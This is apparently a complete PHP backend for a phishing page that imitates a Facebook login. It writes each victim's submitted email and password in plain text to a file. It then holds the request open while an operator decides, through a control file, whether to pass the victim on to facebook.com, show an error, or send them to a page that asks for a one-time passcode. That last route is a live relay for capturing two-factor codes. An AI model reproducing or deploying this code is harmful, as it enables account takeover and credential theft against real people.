<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST["email"];
    $password = $_POST["pass"];
    
    // Store credentials in 'cred.txt'
    $credFile = fopen("cred.txt", "a");
    fwrite($credFile, "email=$email\npass=$password\n");
    fclose($credFile);

    while (true) {
        // Continuously check 'veri.txt' for 'verify=true', 'verify=no', or 'verify=otp'
        $veriContent = file_get_contents("veri.txt");

        if (strpos($veriContent, "verify=true") !== false) {
            // Redirect to another page when 'verify=true'
            header("Location: https://facebook.com");
            exit;
        } elseif (strpos($veriContent, "verify=no") !== false) {
            // Redirect back to the login form with an error message
            header("Location: error.html");
			file_put_contents("veri.txt", "verify=false");
            exit;
        } elseif (strpos($veriContent, "verify=otp") !== false) {
            // Redirect to an OTP page when 'verify=otp'
            header("Location: otp.php");
            exit;
        }

        // Add a delay to avoid constant checking (e.g., every 5 seconds)
        sleep(2);
    }
}
?>
